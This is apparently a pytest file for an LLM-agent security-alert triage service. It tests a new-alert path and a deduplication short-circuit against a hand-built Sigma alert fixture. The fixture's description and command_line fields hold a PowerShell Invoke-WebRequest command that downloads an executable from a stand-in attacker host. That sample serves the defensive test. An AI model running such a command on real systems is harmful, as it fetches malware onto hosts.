from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

from fastapi.testclient import TestClient

import main


def _build_sigma_raw_alert() -> dict:
    """Hand-built fixture using the confirmed Sigma/event_data field paths
    (see alert_builder.py's module docstrings and CHANGES.md's v3-final
    section) — deliberately not derived from any single captured sample, since
    alert_builder.py must not be designed around just one alert's shape. The
    envelope shape (type/source/sourceRef/title/description/severity/tlp/pap/
    date/tags/observables) matches SOC-3s-ARCHITECTURE-v3-final.md §3/§13."""
    rule_name = "Suspicious Invoke-WebRequest Execution"
    rule_uuid = "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
    hostname = "win-kvkmd51ggkq"
    sha256 = "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94"

    description = (
        "Detection engine: sigma\n"
        f"Rule: {rule_name} ({rule_uuid})\n"
        f"Host: {hostname} (172.20.24.99)\n"
        "Command line: powershell.exe -c Invoke-WebRequest -Uri https://evil.example/x.exe"
    )

    return {
        "type": "sigma",
        "source": "security-onion",
        "sourceRef": "6qS9fp8BiUkBvoTNPeON",
        "title": f"[HIGH] {rule_name} - {hostname}",
        "description": description,
        "severity": 3,
        "tlp": 2,
        "pap": 2,
        "date": 1784710559000,
        "tags": ["engine:sigma", f"rule:{rule_name}", "security-onion", hostname],
        "observables": [
            {"dataType": "hash", "data": sha256, "ioc": True, "tags": ["sha256"]},
        ],
        "event_data": {
            "host": {"hostname": hostname, "ip": ["172.20.24.99"], "os": {"family": "windows"}},
            "user": {"name": "jdoe", "id": "S-1-5-21-1234"},
            "process": {
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -c Invoke-WebRequest -Uri https://evil.example/x.exe",
                "pid": 4821,
                "working_directory": "C:\\Users\\jdoe\\",
                "hash": {"sha256": sha256, "md5": "bf7a6e7a62c3f5b2e8e069438ac1dd3d"},
                "pe": {"imphash": "a1b2c3d4e5f60718293a4b5c6d7e8f90"},
                "parent": {
                    "name": "explorer.exe",
                    "command_line": "C:\\Windows\\explorer.exe",
                    "pid": 2044,
                },
            },
        },
    }


class _FakeMsg:
    def __init__(self, content):
        self.type = "ai"
        self.content = content
        self.tool_calls = None


def _fake_react_agent(json_output: dict) -> MagicMock:
    agent = MagicMock()
    agent.invoke.return_value = {"messages": [_FakeMsg(json.dumps(json_output))]}
    return agent


def _fake_llm_response(json_output: dict) -> MagicMock:
    resp = MagicMock()
    resp.content = json.dumps(json_output)
    return resp


@patch("main.get_full_alert_with_analysis")
@patch("nodes.analyze._llm")
@patch("nodes.investigate.create_react_agent")
@patch("nodes.perceive.create_react_agent")
def test_triage_end_to_end_new_alert_no_500(
    mock_perceive_create_agent, mock_investigate_create_agent, mock_analyze_llm, mock_hive_fetch,
):
    """Full /triage round trip with a hand-built Sigma alert fixture (see
    _build_sigma_raw_alert), all external calls mocked: TheHive fetch (Gate 0/
    perceive's pre-fetch), the LLM behind Agent 1 (perceive) and Agent 2
    (investigate) ReAct loops, and Agent 3's direct LLM call. Qdrant/ES/iTop/
    Cortex are only reachable through the ReAct agents' tool-calling loop,
    which is mocked wholesale here, so they're covered transitively — no live
    service of any kind is required."""
    mock_hive_fetch.return_value = None  # no existing TheHive record for this test alert_id

    mock_perceive_create_agent.return_value = _fake_react_agent({
        "mitre_mapping": [
            {"tactic": "execution", "technique": "T1059", "confidence": "medium", "basis": "process execution observed"}
        ],
        "correlation_result": {"action": "new", "mode": "new", "reason": "no_match", "confidence": "high"},
    })

    mock_investigate_create_agent.return_value = _fake_react_agent({
        "rule_context": {"description": "Execution Of Non-Existing File", "detection_logic": "", "known_fp_conditions": [], "mitre_tags_from_source": [], "severity_from_source": "high"},
        "asset_context": {"hostname": "soc-vostro-3910", "criticality": "high"},
        "threat_intel": [],
        "temporal_context": {},
        "historical_context": {},
        "investigation_gaps": [],
    })

    mock_analyze_llm.invoke.return_value = _fake_llm_response({
        "likelihood": "possible",
        "impact_if_true": "moderate",
        "verdict": "needs_review",
        "mitre_mapping": [{"tactic": "execution", "technique": "T1059", "confidence": "medium", "basis": "process execution, unconfirmed intent"}],
        "reasoning": "asset_context.criticality=high and rule_context.severity_from_source=high, but no threat_intel corroboration",
        "recommended_action": "needs_review",
        "summary": "Process execution alert on a high-criticality host with no corroborating threat intel; flagged for analyst review.",
    })

    client = TestClient(main.app)
    payload = {
        "thehive_alert_id": "~test-e2e-001",
        "raw_alert": _build_sigma_raw_alert(),
        "asset_context": {"organization_name": "TrustShield", "business_criticity": "high"},
    }

    response = client.post("/triage", json=payload)

    assert response.status_code == 200, response.text
    result = response.json()
    assert result["alert_id"] == "~test-e2e-001"
    assert result["action"] == "needs_review"
    assert result["verdict"] == "needs_review"
    assert result["severity"] == "medium"  # SEVERITY_TABLE[("possible", "moderate")]
    assert result["mitre_mapping"][0]["technique"] == "T1059"
    # gate0/perceive ran (didn't short-circuit as deduplicated) and reached investigate+analyze
    assert result["correlation_result"]["action"] == "new"


@patch("main.get_full_alert_with_analysis")
@patch("nodes.perceive.create_react_agent")
def test_triage_end_to_end_deduplicated_short_circuits_before_investigate(
    mock_perceive_create_agent, mock_hive_fetch,
):
    """Gate 0 is pure Python — if it flags a duplicate, format_output must short
    circuit before Agent 2/3 run at all. REDIS_URL is unset in this test
    environment so gate0 never actually reports a duplicate on its own; this test
    instead verifies the graph's routing contract directly: perceive() being
    forced to report action=deduplicated (as gate0 would on a real hit) must
    still produce a clean TriageResult without invoking investigate's agent."""
    mock_hive_fetch.return_value = None
    mock_perceive_create_agent.return_value = _fake_react_agent({
        "mitre_mapping": [],
        "correlation_result": {"action": "deduplicated", "mode": "new", "reason": "no_match", "confidence": "high"},
    })

    client = TestClient(main.app)
    payload = {
        "thehive_alert_id": "~test-e2e-002",
        "raw_alert": _build_sigma_raw_alert(),
        "asset_context": {},
    }

    with patch("nodes.investigate.create_react_agent") as mock_investigate_create_agent:
        response = client.post("/triage", json=payload)
        mock_investigate_create_agent.assert_not_called()

    assert response.status_code == 200, response.text
    result = response.json()
    assert result["action"] == "deduplicated"
    assert result["verdict"] is None
